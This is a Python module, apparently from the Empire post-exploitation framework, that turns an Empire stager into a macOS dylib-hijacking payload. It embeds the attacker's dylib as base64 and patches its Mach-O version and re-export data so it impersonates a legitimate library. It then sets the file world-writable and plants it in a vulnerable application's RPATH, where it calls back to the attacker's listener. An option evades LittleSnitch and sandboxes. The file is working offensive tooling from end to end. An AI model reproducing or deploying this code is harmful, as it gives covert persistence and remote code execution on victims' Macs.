import base64
class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'CreateDylibHijacker',

            # list of one or more authors for the module
            'Author': ['@patrickwardle,@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('Configures and Empire dylib for use in a Dylib hijack, given the path to a legitimate dylib of a vulnerable application. The architecture of the dylib must match the target application. The configured dylib will be copied local to the hijackerPath'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': [
                'comment',
                'https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Arch' : {
                'Description'   :   'Arch: x86/x64',
                'Required'      :   True,
                'Value'         :   'x86'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'LegitimateDylibPath' : {
                'Description'   :   'Full path to the legitimate dylib of the vulnerable application',
                'Required'      :   True,
                'Value'         :   ''
            },
            'VulnerableRPATH' : {
                'Description'   :   'Full path to where the hijacker should be planted. This will be the RPATH in the Hijack Scanner module.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
        arch = self.options['Arch']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
        launcher = launcher.strip('echo').strip(' | python &').strip("\"")
        dylibBytes = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker='true')
        encodedDylib = base64.b64encode(dylibBytes)
        dylib = self.options['LegitimateDylibPath']['Value']
        vrpath = self.options['VulnerableRPATH']['Value']

        script = """
from ctypes import *
def run(attackerDYLIB):

    import ctypes
    import io
    import os
    import sys
    import fcntl
    import shutil
    import struct
    import stat


    LC_REQ_DYLD = 0x80000000
    LC_LOAD_WEAK_DYLIB = LC_REQ_DYLD | 0x18
    LC_RPATH = (0x1c | LC_REQ_DYLD)
    LC_REEXPORT_DYLIB = 0x1f | LC_REQ_DYLD

    (
        LC_SEGMENT, LC_SYMTAB, LC_SYMSEG, LC_THREAD, LC_UNIXTHREAD, LC_LOADFVMLIB,
        LC_IDFVMLIB, LC_IDENT, LC_FVMFILE, LC_PREPAGE, LC_DYSYMTAB, LC_LOAD_DYLIB,
        LC_ID_DYLIB, LC_LOAD_DYLINKER, LC_ID_DYLINKER, LC_PREBOUND_DYLIB,
        LC_ROUTINES, LC_SUB_FRAMEWORK, LC_SUB_UMBRELLA, LC_SUB_CLIENT,
        LC_SUB_LIBRARY, LC_TWOLEVEL_HINTS, LC_PREBIND_CKSUM
    ) = range(0x1, 0x18)

    MH_MAGIC = 0xfeedface
    MH_CIGAM = 0xcefaedfe
    MH_MAGIC_64 = 0xfeedfacf
    MH_CIGAM_64 = 0xcffaedfe

    _CPU_ARCH_ABI64  = 0x01000000

    CPU_TYPE_NAMES = {
        -1:     'ANY',
        1:      'VAX',
        6:      'MC680x0',
        7:      'i386',
        _CPU_ARCH_ABI64  | 7:    'x86_64',
        8:      'MIPS',
        10:     'MC98000',
        11:     'HPPA',
        12:     'ARM',
        13:     'MC88000',
        14:     'SPARC',
        15:     'i860',
        16:     'Alpha',
        18:     'PowerPC',
        _CPU_ARCH_ABI64  | 18:    'PowerPC64',
    }



    #structs that we need

    class mach_header(ctypes.Structure):

        _fields_ = [

            ("magic", ctypes.c_uint),
            ("cputype", ctypes.c_uint),
            ("cpusubtype", ctypes.c_uint),
            ("filetype", ctypes.c_uint),
            ("ncmds", ctypes.c_uint),
            ("sizeofcmds", ctypes.c_uint),
            ("flags", ctypes.c_uint)

        ]

    class mach_header_64(ctypes.Structure):
        _fields_ = mach_header._fields_ + [('reserved',ctypes.c_uint)]

    class load_command(ctypes.Structure):
        _fields_ = [
            ("cmd", ctypes.c_uint),
            ("cmdsize", ctypes.c_uint)
        ]


    LC_HEADER_SIZE = 0x8


    def checkPrereqs(attackerDYLIB, targetDYLIB):


        if not os.path.exists(attackerDYLIB):


            print 'ERROR: dylib \\'%%s\\' not found' %% (attackerDYLIB)
            return False


        if not os.path.exists(targetDYLIB):


            print 'ERROR: dylib \\'%%s\\' not found' %% (targetDYLIB)
            return False

        attacker = open(attackerDYLIB)
        target = open(targetDYLIB)

        attackerHeader = mach_header.from_buffer_copy(attacker.read(28))
        targetHeader = mach_header.from_buffer_copy(target.read(28))

        if attackerHeader.cputype != targetHeader.cputype:
            print 'ERROR: Architecture mismatch'
            attacker.close()
            target.close()
            return False

        return True


    def findLoadCommand(fileHandle, targetLoadCommand):


        MACHHEADERSZ64 = 32
        MACHHEADERSZ = 28
        matchedOffsets = []
        #wrap
        try:
            header = mach_header.from_buffer_copy(fileHandle.read(MACHHEADERSZ))
            if header.magic == MH_MAGIC_64:
                fileHandle.seek(0, io.SEEK_SET)
                header = mach_header_64.from_buffer_copy(fileHandle.read(MACHHEADERSZ64))
            ncmds = header.ncmds

            # Get to the load commands
            current = fileHandle.tell() #save offset to load command

            for cmd in range(ncmds):

                offset = current
                lc = load_command.from_buffer_copy(fileHandle.read(LC_HEADER_SIZE))
                size = lc.cmdsize
                if lc.cmd == targetLoadCommand:

                    matchedOffsets.append(offset)

                fileHandle.seek(size - LC_HEADER_SIZE, io.SEEK_CUR)
                current = fileHandle.tell()

        #exceptions
        except Exception, e:

            #err msg
            print 'EXCEPTION (finding load commands): %%s' %% e

            #reset
            matchedOffsets = None

        return matchedOffsets

    #configure version info
    #  1) find/extract version info from target .dylib
    #  2) find/update version info from hijacker .dylib to match target .dylib
    def configureVersions(attackerDYLIB, targetDYLIB):

        #wrap
        try:

            #dbg msg
            print ' [+] parsing \\'%%s\\' to extract version info' %% (os.path.split(targetDYLIB)[1])

            #open target .dylib
            fileHandle = open(targetDYLIB, 'rb')

            #find LC_ID_DYLIB load command
            # ->and check
            versionOffsets = findLoadCommand(fileHandle, LC_ID_DYLIB)
            if not versionOffsets or not len(versionOffsets):

                #err msg
                print 'ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %%s' %% (os.path.split(targetDYLIB)[1])

                #bail
                return False

            #dbg msg
            print '     found \\'LC_ID_DYLIB\\' load command at offset(s): %%s' %% (versionOffsets)

            #seek to offset of LC_ID_DYLIB
            fileHandle.seek(versionOffsets[0], io.SEEK_SET)

            #seek to skip over LC header and timestamp
            fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

            '''
            struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
            '''

            #extract current version
            currentVersion = fileHandle.read(4)

            #extract compatibility version
            compatibilityVersion = fileHandle.read(4)

            #dbg msg(s)
            print '     extracted current version: 0x%%x' %% (struct.unpack('<L', currentVersion)[0])
            print '     extracted compatibility version: 0x%%x' %% (struct.unpack('<L', compatibilityVersion)[0])

            #close
            fileHandle.close()

            #dbg msg
            print ' [+] parsing \\'%%s\\' to find version info' %% (os.path.split(attackerDYLIB)[1])

            #open target .dylib
            fileHandle = open(attackerDYLIB, 'rb+')

            #find LC_ID_DYLIB load command
            # ->and check
            versionOffsets = findLoadCommand(fileHandle, LC_ID_DYLIB)
            if not versionOffsets or not len(versionOffsets):

                #err msg
                print 'ERROR: failed to find \\'LC_ID_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1])

                #bail
                return False

            #dbg msg(s)
            print '     found \\'LC_ID_DYLIB\\' load command at offset(s): %%s' %% (versionOffsets)
            print ' [+] updating version info in %%s to match %%s' %% ((os.path.split(attackerDYLIB)[1]), (os.path.split(targetDYLIB)[1]))

            #update version info
            for versionOffset in versionOffsets:

                #seek to offset of LC_ID_DYLIB
                fileHandle.seek(versionOffset, io.SEEK_SET)

                #seek to skip over LC header and timestamp
                fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)

                #dbg msg
                print 'setting version info at offset %%s' %% (versionOffset)

                #set current version
                fileHandle.write(currentVersion)

                #set compatability version
                fileHandle.write(compatibilityVersion)

            #close
            fileHandle.close()

        except Exception, e:

            #err msg
            print 'EXCEPTION (configuring version info): %%s' %% e


        return True

    #configure re-export
    # ->update hijacker .dylib to re-export everything to target .dylib
    def configureReExport(attackerDYLIB, targetDYLIB):

        #wrap
        try:

            #dbg msg
            print ' [+] parsing \\'%%s\\' to extract faux re-export info' %% (os.path.split(attackerDYLIB)[1])

            #open attacker's .dylib
            fileHandle = open(attackerDYLIB, 'rb+')

            #find LC_REEXPORT_DYLIB load command
            # ->and check
            reExportOffsets = findLoadCommand(fileHandle, LC_REEXPORT_DYLIB)
            if not reExportOffsets or not len(reExportOffsets):

                #err msg
                print 'ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1])

                #bail
                return False

            #dbg msg
            print '     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %%s' %% (reExportOffsets)

            '''
            struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
            '''

            #update re-export info
            #TODO: does the current and compat version need to match? we can easily set it
            for reExportOffset in reExportOffsets:

                #seek to offset of LC_REEXPORT_DYLIB
                fileHandle.seek(reExportOffset, io.SEEK_SET)

                #seek to skip over command
                fileHandle.seek(0x4, io.SEEK_CUR)

                #read in size of load command
                commandSize = struct.unpack('<L', fileHandle.read(4))[0]

                #dbg msg
                print '     extracted LC command size: 0x%%x' %% (commandSize)

                #read in path offset
                pathOffset = struct.unpack('<L', fileHandle.read(4))[0]

                #dbg msg
                print '     extracted path offset: 0x%%x' %% (pathOffset)

                #seek to path offset
                fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)

                #calc length of path
                # it makes up rest of load command data
                pathSize = commandSize - (fileHandle.tell() - reExportOffset)

                #dbg msg
                print '     computed path size: 0x%%x' %% (pathSize)

                #read out path
                data = targetDYLIB + '\\0' * (pathSize - len(targetDYLIB))
                fileHandle.write(data)

                #path can include NULLs so lets chop those off
                #path = path.rstrip('\0')

                #dbg msg(s)
                #print '     extracted faux path: %%s' %% (path)

                #close
                fileHandle.close()

                #dbg msg
                print ' [+] updated embedded re-export'

                #wrap

        #handle exceptions
        except Exception, e:

            #err msg
            print 'EXCEPTION (configuring re-exports): %%s' %% e

            #bail
            return False

        return True

    def configure(attackerDYLIB, targetDYLIB):

        #configure version info
        # ->update attacker's .dylib to match target .dylib's version info
        if not configureVersions(attackerDYLIB, targetDYLIB):

            #err msg
            print 'ERROR: failed to configure version info'

            #bail
            return False

        #configure re-export
        # ->update attacker's .dylib to re-export everything to target .dylib
        if not configureReExport(attackerDYLIB, targetDYLIB):

            #err msg
            print 'ERROR: failed to configure re-export'

            #bail
            return False

        return True

    
    #target .dylib
    targetDYLIB = "%s"

    vrpath = "%s"


    #configured .dylib
    configuredDYLIB = ""

    #init output path for configured .dylib
    configuredDYLIB = os.path.split(attackerDYLIB)[0]+'/' + os.path.split(targetDYLIB)[1]

    #dbg msg
    print ' [+] configuring %%s to hijack %%s' %% (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1])

    #check prereqs
    # ->i.e. sanity checks
    if not checkPrereqs(attackerDYLIB, targetDYLIB):

        #err msg
        print 'ERROR: prerequisite check failed\\n'

        #bail
        return ""

    #configure the provide .dylib
    if not configure(attackerDYLIB, targetDYLIB):

        #err msg
        print 'ERROR: failed to configure %%s\\n' %% (os.path.split(targetDYLIB)[1])

        #bail
        return ""

    #dbg msg
    print ' [+] copying configured .dylib to %%s' %% (configuredDYLIB)

    #make a (local) copy w/ name
    shutil.copy2(attackerDYLIB, configuredDYLIB)

    os.remove(attackerDYLIB)
    if not os.path.exists(os.path.split(vrpath)[0]):
        os.makedirs(os.path.split(vrpath)[0])

    os.chmod(configuredDYLIB, 0777)
    shutil.copy2(configuredDYLIB, vrpath)

    os.remove(configuredDYLIB)
    #dbg msg
    
    print '\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath)

import base64
import uuid
encbytes = "%s"
filename = str(uuid.uuid4())
path = "/tmp/" + filename + ".dylib"
decodedDylib = base64.b64decode(encbytes)
temp = open(path,'wb')
temp.write(decodedDylib)
temp.close()
run(path)
""" % (dylib,vrpath,encodedDylib)

        return script
